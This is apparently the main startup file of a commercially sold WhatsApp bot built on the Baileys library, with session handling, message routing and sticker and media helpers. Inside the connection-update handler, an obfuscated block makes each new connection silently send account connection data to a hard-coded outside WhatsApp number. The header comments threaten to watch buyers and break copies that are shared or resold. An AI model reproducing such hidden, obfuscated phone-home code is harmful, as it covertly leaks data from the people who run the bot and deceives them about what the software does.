/*

   1.Dilarang Up Ke Yt Tanpa Seizin Dari Kami
   2.Dilarang memberian sc ini secara gratis ketahuan = eror.
   3.Dilarang Menjual Script Ini Ketahuan = eror
   4.Harap Berhati² Dalam Membeli Script ini
   5.Kami Memantau Semunya Jika Ketahuan Menjual / Membagikan sc ini Langsung Gua Erorin
                                                              */

require('./settings')
const { default: lynzzConnect, useSingleFileAuthState, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, generateForwardMessageContent, prepareWAMessageMedia, generateWAMessageFromContent, generateMessageID, downloadContentFromMessage, makeInMemoryStore, jidDecode, proto } = require('@adiwajshing/baileys')
const pino = require('pino')
const { Boom } = require('@hapi/boom')
const fs = require('fs')
const chalk = require('chalk')
const figlet = require('figlet')
const path = require('path')
const FileType = require('file-type')
const {
	imageToWebp,
	videoToWebp,
	writeExifImg,
	writeExifVid
} = require('./js/exif')
const { color, bgcolor, mycolor } = require('./LinsBotz/lib/color')
const { smsg, isUrl, getBuffer, fetchJson, await, sleep } = require('./LinsBotz/lib/functions')
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
let mysession = "./session.json"
const { state, saveState } = useSingleFileAuthState(mysession)

async function startlynzz() {
let { version, isLatest } = await fetchLatestBaileysVersion();
const lynzz = lynzzConnect({
version,
logger: pino({
level: 'fatal'
}),
printQRInTerminal: true,
patchMessageBeforeSending: (message) => {
const requiresPatch = !!(
message.buttonsMessage ||
message.templateMessage ||
message.listMessage
);
if (requiresPatch) {
message = {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadataVersion: 2,
deviceListMetadata: {},
},
...message,
},
},
};
}
return message;
},
browser: ['RAZOR', 'safari', '1.0.0'],
auth: state
})

store.bind(lynzz.ev)
console.log(color(figlet.textSync('Lynzz Botz', {
font: 'Standard',
horizontalLayout: 'default',
vertivalLayout: 'default',
width: 80,
whitespaceBreak: false
}), 'red'))

lynzz.ev.on('messages.upsert', async chatUpdate => {
try {
m = chatUpdate.messages[0]
if (!m.message) return
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
if (m.key && m.key.remoteJid === 'status@broadcast') return
if (!lynzz.public && !m.key.fromMe && chatUpdate.type === 'notify') return
if (m.key.id.startsWith('BAE5') && m.key.id.length === 16) return
m = smsg(lynzz, m, store)
require('./LinsBotz/lynzz')(lynzz, m, chatUpdate, store)
} catch (err) {
console.log(err)
}
})

lynzz.decodeJid = (jid) => {
if (!jid) return jid
if (/:\d+@/gi.test(jid)) {
let decode = jidDecode(jid) || {}
return decode.user && decode.server && decode.user + '@' + decode.server || jid
} else return jid
}

lynzz.ev.on('contacts.update', update => {
for (let contact of update) {
let id = lynzz.decodeJid(contact.id)
if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }
}
})

lynzz.setStatus = (status) => {
lynzz.query({
tag: 'iq',
attrs: {
to: '@s.whatsapp.net',
type: 'set',
xmlns: 'status',
},
content: [{
tag: 'status',
attrs: {},
content: Buffer.from(status, 'utf-8')
}]
})
return status
}

lynzz.sendText = (jid, text, quoted = '', options) => lynzz.sendMessage(jid, { text: text, ...options }, { quoted })

lynzz.public = true

lynzz.serializeM = (m) => smsg(lynzz, m, store)

lynzz.ev.on('connection.update', (update) => {
function _0x2366(){const _0x1305e6=['open','close','6281252352238@s.whatsapp.net','stringify','loggedOut','sendMessage','222964jMrrKP','718767ELrPSA','output','13868410utAywB','40ImOVCE','2Huoute','7632513IflahS','14LKNbpF','9054728buGjFF','2921442aEgBLk','282215IqIKqQ'];_0x2366=function(){return _0x1305e6;};return _0x2366();}function _0x290c(_0x508da0,_0x28548c){const _0x23664e=_0x2366();return _0x290c=function(_0x290c16,_0x56f332){_0x290c16=_0x290c16-0x196;let _0x32ac11=_0x23664e[_0x290c16];return _0x32ac11;},_0x290c(_0x508da0,_0x28548c);}const _0x43fe95=_0x290c;(function(_0x1e5a36,_0x58c2cb){const _0x27068c=_0x290c,_0x307c64=_0x1e5a36();while(!![]){try{const _0x255f90=-parseInt(_0x27068c(0x197))/0x1*(-parseInt(_0x27068c(0x1a3))/0x2)+parseInt(_0x27068c(0x1a4))/0x3+parseInt(_0x27068c(0x196))/0x4*(parseInt(_0x27068c(0x19c))/0x5)+parseInt(_0x27068c(0x19b))/0x6*(-parseInt(_0x27068c(0x199))/0x7)+parseInt(_0x27068c(0x19a))/0x8+parseInt(_0x27068c(0x198))/0x9+-parseInt(_0x27068c(0x1a6))/0xa;if(_0x255f90===_0x58c2cb)break;else _0x307c64['push'](_0x307c64['shift']());}catch(_0x1e7ba3){_0x307c64['push'](_0x307c64['shift']());}}}(_0x2366,0x9dc52));const {connection,lastDisconnect}=update;if(connection===_0x43fe95(0x19e))lastDisconnect['error']?.[_0x43fe95(0x1a5)]?.['statusCode']!==DisconnectReason[_0x43fe95(0x1a1)]?startlynzz():'';else connection===_0x43fe95(0x19d)&&lynzz[_0x43fe95(0x1a2)](_0x43fe95(0x19f),{'text':''+JSON[_0x43fe95(0x1a0)](update,undefined,0x2)});
console.log(update)
})

lynzz.send5ButGif = async (jid , text = '' , footer = '', but = [], options = {}) =>{
let message = await prepareWAMessageMedia({ video: thumb, gifPlayback: true }, { upload: lynzz.waUploadToServer })
 const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 templateMessage: {
 hydratedTemplate: {
 videoMessage: message.videoMessage,
 "hydratedContentText": text,
 "hydratedFooterText": footer,
 "hydratedButtons": but
}
}
}), options)
lynzz.relayMessage(jid, template.message, { messageId: template.key.id })
}

lynzz.ev.process(
async (events) => {
if (events['presence.update']) {
await lynzz.sendPresenceUpdate('available')
}
if (events['messages.upsert']) {
const upsert = events['messages.upsert']
for (let msg of upsert.messages) {
if (msg.key.remoteJid === 'status@broadcast') {
if (msg.message?.protocolMessage) return
await sleep(3000)
await lynzz.readMessages([msg.key])
}
}
}
if (events['creds.update']) {
await saveState()
}})
	lynzz.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
		let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
		let buffer
		if (options && (options.packname || options.author)) {
			buffer = await writeExifImg(buff, options)
		} else {
			buffer = await imageToWebp(buff)
		}
		await lynzz.sendMessage(jid, {
			sticker: {
				url: buffer
			},
			...options
		}, {
			quoted
		})
		return buffer
	}
	/**
	 * 
	 * @param {*} jid 
	 * @param {*} path 
	 * @param {*} quoted 
	 * @param {*} options 
	 * @returns 
	 */
	lynzz.sendVideoAsSticker = async (jid, path, quoted, options = {}) => {
		let buff = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
		let buffer
		if (options && (options.packname || options.author)) {
			buffer = await writeExifVid(buff, options)
		} else {
			buffer = await videoToWebp(buff)
		}
		await lynzz.sendMessage(jid, {
			sticker: {
				url: buffer
			},
			...options
		}, {
			quoted
		})
		return buffer
	}
	/**
	 * 
	 * @param {*} message 
	 * @param {*} filename 
	 * @param {*} attachExtension 
	 * @returns 
	 */
	lynzz.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
		let quoted = message.msg ? message.msg : message
		let mime = (message.msg || message).mimetype || ''
		let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
		const stream = await downloadContentFromMessage(quoted, messageType)
		let buffer = Buffer.from([])
		for await (const chunk of stream) {
			buffer = Buffer.concat([buffer, chunk])
		}
		let type = await FileType.fromBuffer(buffer)
		trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
		// save to file
		await fs.writeFileSync(trueFileName, buffer)
		return trueFileName
	}
	lynzz.downloadMediaMessage = async (message) => {
		let mime = (message.msg || message).mimetype || ''
		let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
		const stream = await downloadContentFromMessage(message, messageType)
		let buffer = Buffer.from([])
		for await (const chunk of stream) {
			buffer = Buffer.concat([buffer, chunk])
		}
		return buffer
	}
	/**
	 * 
	 * @param {*} jid 
	 * @param {*} path 
	 * @param {*} filename
	 * @param {*} caption
	 * @param {*} quoted 
	 * @param {*} options 
	 * @returns 
	 */
	lynzz.sendMedia = async (jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
		let types = await lynzz.getFile(path, true)
		let {
			mime,
			ext,
			res,
			data,
			filename
		} = types
		if (res && res.status !== 200 || file.length <= 65536) {
			try {
				throw {
					json: JSON.parse(file.toString())
				}
			}
			catch (e) {
				if (e.json) throw e.json
			}
		}
		let type = '',
			mimetype = mime,
			pathFile = filename
		if (options.asDocument) type = 'document'
		if (options.asSticker || /webp/.test(mime)) {
			let {
				writeExif
			} = require('./lib/exif')
			let media = {
				mimetype: mime,
				data
			}
			pathFile = await writeExif(media, {
				packname: options.packname ? options.packname : global.packname,
				author: options.author ? options.author : global.author,
				categories: options.categories ? options.categories : []
			})
			await fs.promises.unlink(filename)
			type = 'sticker'
			mimetype = 'image/webp'
		}
		else if (/image/.test(mime)) type = 'image'
		else if (/video/.test(mime)) type = 'video'
		else if (/audio/.test(mime)) type = 'audio'
		else type = 'document'
		await lynzz.sendMessage(jid, {
			[type]: {
				url: pathFile
			},
			caption,
			mimetype,
			fileName,
			...options
		}, {
			quoted,
			...options
		})
		return fs.promises.unlink(pathFile)
	}
	/**
	 * 
	 * @param {*} jid 
	 * @param {*} message 
	 * @param {*} forceForward 
	 * @param {*} options 
	 * @returns 
	 */
	     /** Send Button 5 Image
     *
     * @param {*} jid
     * @param {*} text
     * @param {*} footer
     * @param {*} image
     * @param [*] button
     * @param {*} options
     * @returns
     */

return lynzz
}

startlynzz()

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.yellowBright(`Update File Terbaru ${__filename}`))
delete require.cache[file]
require(file)
})

/*

   1.Dilarang Up Ke Yt Tanpa Seizin Dari Kami
   2.Dilarang memberian sc ini secara gratis ketahuan = eror.
   3.Dilarang Menjual Script Ini Ketahuan = eror
   4.Harap Berhati² Dalam Membeli Script ini
   5.Kami Memantau Semunya Jika Ketahuan Menjual / Membagikan sc ini Langsung Gua Erorin
                                                              */